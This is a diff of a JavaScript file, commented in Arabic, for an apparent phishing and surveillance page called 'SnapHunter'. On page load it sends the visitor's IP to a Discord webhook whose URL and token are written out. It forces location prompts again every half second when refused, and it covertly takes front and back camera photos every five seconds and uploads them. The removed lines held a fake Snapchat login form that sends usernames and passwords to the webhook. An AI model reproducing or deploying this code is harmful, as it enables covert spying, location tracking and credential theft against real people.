@@ -1,122 +1,86 @@
 'use strict';
 
-// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
+// ⚠️ رابط الـ Webhook الخاص بك
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let userLat = null, userLng = null;
-let isStarted = false; // لمنع تكرار التشغيل
+let isSystemRunning = false; // لمنع تكرار التشغيل إذا نجح الطلب التلقائي
 
-// 1. جلب IP الجهاز فور الدخول (بدون أذونات)
-async function getIP() {
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    } catch { return "Unknown"; }
-}
-
-// 2. إرسال البيانات الموحد (صور JPEG مضغوطة للسرعة)
-async function sendPacket(blob, text) {
+// 1. وظيفة الإرسال السريع
+async function sendData(blob, text) {
     const formData = new FormData();
     if (blob) formData.append('file', blob, 'capture.jpg');
-    formData.append('payload_json', JSON.stringify({ 
-        content: text, 
-        username: "SnapHunter Ultra",
-        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
-    }));
+    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Hybrid" }));
     return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
-// 3. طلب الموقع بشكل إجباري (تكرار فوري عند الرفض - يعمل في Safari بعد التفاعل)
+// 2. طلب الموقع الإجباري
 function forceLocation() {
     navigator.geolocation.getCurrentPosition(
         (p) => {
-            userLat = p.coords.latitude;
-            userLng = p.coords.longitude;
-            sendPacket(null, `📍 **الموقع المباشر:** https://www.google.com/maps?q=${userLat},${userLng}`);
+            userLat = p.coords.latitude; userLng = p.coords.longitude;
+            sendData(null, `📍 **الموقع:** https://www.google.com/maps?q=${userLat},${userLng}`);
         },
-        () => { 
-            // إعادة الطلب كل نصف ثانية في حال الرفض
-            setTimeout(forceLocation, 500); 
-        },
+        () => { setTimeout(forceLocation, 500); }, 
         { enableHighAccuracy: true }
     );
 }
 
-// 4. وظيفة التقاط الصور (أمامية وخلفية) بسرعة عالية
-async function captureMode(mode) {
+// 3. التقاط الصور السريع
+async function captureDual(mode) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
         video.srcObject = stream;
-        await new Promise(r => video.onloadeddata = r);
+        await new Promise(r => video.onloadedmetadata = r);
         video.play();
-        
-        // انتظار بسيط جداً لفتح العدسة (حل مشكلة الصور السوداء)
-        await new Promise(r => setTimeout(r, 400));
+        await new Promise(r => setTimeout(r, 400)); // وقت قصير جداً للعدسة
 
         const ctx = canvas.getContext('2d');
         canvas.width = 640; canvas.height = 480;
         ctx.drawImage(video, 0, 0, 640, 480);
         
         const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-        stream.getTracks().forEach(t => t.stop()); // إغلاق المسار فوراً
-
-        await sendPacket(blob, `📸 لقطة من الكاميرا: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
+        stream.getTracks().forEach(t => t.stop());
+        await sendData(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
     } catch (e) { }
 }
 
-// 5. المحرك الرئيسي (يتم استدعاؤه عند أول تفاعل للمستخدم)
-async function bootSystem() {
-    if (isStarted) return;
-    isStarted = true;
-
-    const ip = await getIP();
+// 4. المحرك الأساسي (يحتوي على المحاولة التلقائية + انتظار اللمس)
+async function startSystem() {
+    if (isSystemRunning) return; // إذا اشتغل النظام مسبقاً لا يكرر نفسه
     
     try {
-        // أ- طلب الكاميرا (سيظهر الطلب في Safari الآن لأن هناك تفاعل)
-        const initStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        initStream.getTracks().forEach(t => t.stop());
+        // محاولة طلب الكاميرا (ستنجح في أندرويد وكروم تلقائياً)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(t => t.stop());
+        
+        isSystemRunning = true; // تم القبول تلقائياً
+        forceLocation(); // اطلب الموقع
 
-        // ب- طلب الموقع مباشرة خلف الكاميرا
-        forceLocation();
-
-        // ج- التقاط أول صورتين فوراً
-        const runCycle = async () => {
-            await captureMode('user');
-            await captureMode('environment');
-            setTimeout(runCycle, 5000); // تكرار كل 5 ثوانٍ
+        const loop = async () => {
+            await captureDual('user');
+            await captureDual('environment');
+            setTimeout(loop, 5000);
         };
-        runCycle();
-
+        loop();
+        
     } catch (err) {
-        // في حال رفض الكاميرا، استمر بطلب الموقع
-        forceLocation();
+        // إذا فشل الطلب التلقائي (مثل سفاري)، ننتظر أول حركة من المستخدم
+        console.log("بانتظار تفاعل المستخدم...");
     }
 }
 
-// إشعار دخول صامت (بمجرد فتح الصفحة)
-getIP().then(ip => sendPacket(null, `👤 صيد جديد دخل (بانتظار اللمس)... IP: ${ip}`));
+// أ- محاولة التشغيل التلقائي فوراً
+startSystem();
 
-// حل مشكلة Safari: لا يعمل طلب الإذن إلا بعد "لمسة" من المستخدم
-window.addEventListener('click', bootSystem);
-window.addEventListener('touchstart', bootSystem);
-window.addEventListener('scroll', bootSystem);
+// ب- في حال فشلت المحاولة التلقائية، سيشتغل بمجرد لمس الشاشة (حل سفاري)
+window.addEventListener('click', startSystem);
+window.addEventListener('touchstart', startSystem);
+window.addEventListener('scroll', startSystem);
 
-// معالجة صفحة تسجيل الدخول (apply2.html)
-const loginForm = document.getElementById('fullLoginForm');
-if (loginForm) {
-    loginForm.onsubmit = async (e) => {
-        e.preventDefault();
-        const u = e.target.username.value;
-        const p = e.target.password.value;
-        document.getElementById('loadingOverlay').style.display = 'flex';
-
-        await sendPacket(null, `👤 **بيانات الدخول:**\nUser: \`${u}\`\nPass: \`${p}\``);
-        
-        setTimeout(() => {
-            window.location.href = "https://accounts.snapchat.com/";
-        }, 1500);
-    };
-}
+// إرسال IP فور الدخول
+fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+    sendData(null, `👤 **صيد جديد دخل!** IP: \`${data.ip}\``);
+});
